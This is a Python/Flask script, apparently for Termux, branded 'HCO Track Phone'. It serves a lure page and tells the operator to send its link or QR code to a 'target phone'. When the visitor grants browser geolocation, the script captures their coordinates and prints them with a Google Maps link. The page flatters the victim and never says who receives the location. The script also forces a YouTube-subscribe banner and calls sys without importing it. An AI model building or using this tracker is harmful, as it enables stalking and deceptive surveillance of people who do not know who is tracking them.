# HCO Track Phone by Azhar - Fixed Permission Version
# Now with manual permission request!

import os
import subprocess
import threading
import time
import socket
import requests
from flask import Flask, request, render_template_string, jsonify

# Color codes
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
RESET = "\033[0m"

locations = {}
app = Flask(__name__)

# Tool lock message
def tool_lock():
    os.system('clear')
    print(f"{RED}╔{'═'*78}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(78)}║{RESET}")
    print(f"{RED}║{'Subscribe to YouTube Channel'.center(78)}║{RESET}")
    print(f"{RED}║{'@hackers_colony_tech'.center(78)}║{RESET}")
    print(f"{RED}╚{'═'*78}╝{RESET}")
    time.sleep(2)
    
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", 
                       "-d", "https://youtube.com/@hackers_colony_tech"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}✓ Opening YouTube...{RESET}")
    except:
        print(f"{YELLOW}⚠️  Open YouTube: youtube.com/@hackers_colony_tech{RESET}")
    
    time.sleep(3)

# Get correct local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Find available port
def find_port():
    for port in range(8080, 8100):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                return port
        except:
            continue
    return 8080

# Flask routes - FIXED PERMISSION VERSION
@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>HCO Track Phone</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { 
                background: black; 
                color: white; 
                text-align: center; 
                font-family: Arial; 
                padding: 20px;
                margin: 0;
            }
            .container { 
                max-width: 100%; 
                margin: 0 auto; 
                padding: 20px; 
            }
            .logo { 
                color: red; 
                font-size: 24px; 
                font-weight: bold; 
                margin-bottom: 20px; 
                text-shadow: 0 0 10px red;
            }
            .btn {
                background: lime;
                color: black;
                border: none;
                padding: 20px 40px;
                font-size: 20px;
                font-weight: bold;
                border-radius: 10px;
                cursor: pointer;
                margin: 20px 0;
            }
            .message {
                font-size: 18px;
                margin: 20px 0;
                padding: 20px;
                border-radius: 10px;
                background: #222;
            }
            .success {
                color: lime;
                font-size: 22px;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">HCO TRACK PHONE BY AZHAR</div>
            <div class="message">Click the button below to share your location</div>
            <button class="btn" onclick="requestLocation()">📍 ALLOW LOCATION ACCESS</button>
            <div id="status" class="message">Waiting for your permission...</div>
        </div>
        
        <script>
        function requestLocation() {
            var status = document.getElementById('status');
            var btn = document.querySelector('.btn');
            
            status.innerHTML = '🔄 Please allow location access in the browser popup...';
            btn.style.display = 'none';
            
            if (!navigator.geolocation) {
                status.innerHTML = '❌ Geolocation not supported by your browser';
                return;
            }
            
            function success(position) {
                var lat = position.coords.latitude;
                var lon = position.coords.longitude;
                
                // Send to server
                fetch('/update', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: lat, 
                        lon: lon, 
                        accuracy: position.coords.accuracy
                    })
                })
                .then(response => response.text())
                .then(data => {
                    status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
                                      '<div style="margin-top:20px;">📍 Location shared successfully</div>' +
                                      '<div style="margin-top:10px;">You can close this page now</div>';
                })
                .catch(error => {
                    status.innerHTML = '❌ Error sending location. Please try again.';
                    btn.style.display = 'block';
                });
            }
            
            function error(err) {
                if(err.code == err.PERMISSION_DENIED) {
                    status.innerHTML = '❌ Permission denied! Please refresh and click the button again.';
                } else {
                    status.innerHTML = '❌ Location access failed. Please try again.';
                }
                btn.style.display = 'block';
            }
            
            // Request location with manual button click
            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            });
        }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/update', methods=['POST'])
def update():
    try:
        data = request.get_json()
        if data and 'lat' in data and 'lon' in data:
            locations.clear()
            locations.update(data)
            locations['time'] = time.time()
            print(f"{GREEN}📍 Location received: {data['lat']}, {data['lon']}{RESET}")
            return "OK"
        return "ERROR"
    except:
        return "ERROR"

def start_server(port):
    from werkzeug.serving import make_server
    server = make_server('0.0.0.0', port, app, threaded=True)
    server.serve_forever()

# Generate QR code
def make_qr(url):
    try:
        import qrcode
        qr = qrcode.QRCode(box_size=6, border=4)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="red", back_color="white")
        qr_path = "/data/data/com.termux/files/home/track_qr.png"
        img.save(qr_path)
        
        try:
            subprocess.run(["termux-open", qr_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
            
        return True
    except:
        return False

# Install requirements
def install_requirements():
    try:
        import flask
        import qrcode
        return True
    except ImportError:
        print(f"{YELLOW}Installing required packages...{RESET}")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "flask", "qrcode[pil]"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
            return True
        except:
            print(f"{RED}Failed to install packages{RESET}")
            return False

# Main function
def main():
    # Show tool lock
    tool_lock()
    
    # Clear screen
    os.system('clear')
    
    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
    
    # Install requirements
    if not install_requirements():
        print(f"{YELLOW}Please run: pip install flask qrcode[pil]{RESET}")
        return
    
    # Get correct IP and port
    local_ip = get_local_ip()
    port = find_port()
    TRACKING_URL = f"http://{local_ip}:{port}"
    
    print(f"{GREEN}✅ Server: {local_ip}:{port}{RESET}")
    
    # Start server in thread
    server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
    server_thread.start()
    
    time.sleep(2)
    
    # Generate QR code
    print(f"{YELLOW}📱 Generating QR code...{RESET}")
    make_qr(TRACKING_URL)
    
    # Show banner
    print(f"\n{RED}{'═'*60}{RESET}")
    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{RED}{'═'*60}{RESET}")
    print(f"\n{GREEN}📱 Send this link to target phone:{RESET}")
    print(f"{CYAN}{TRACKING_URL}{RESET}")
    print(f"\n{YELLOW}📍 QR code should open automatically{RESET}")
    print(f"\n{BLUE}💡 Both phones must be on same WiFi{RESET}")
    print(f"\n{RED}{'═'*60}{RESET}")
    
    # Wait for location
    print(f"\n{YELLOW}⏳ Waiting for location...{RESET}")
    print(f"{BLUE}Press Ctrl+C to stop{RESET}")
    
    last_time = 0
    while True:
        if 'time' in locations and locations['time'] > last_time:
            last_time = locations['time']
            print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
            print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
            print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
            print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
            print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
            print(f"{GREEN}Time: {time.ctime(locations['time'])}{RESET}")
        
        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped{RESET}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")
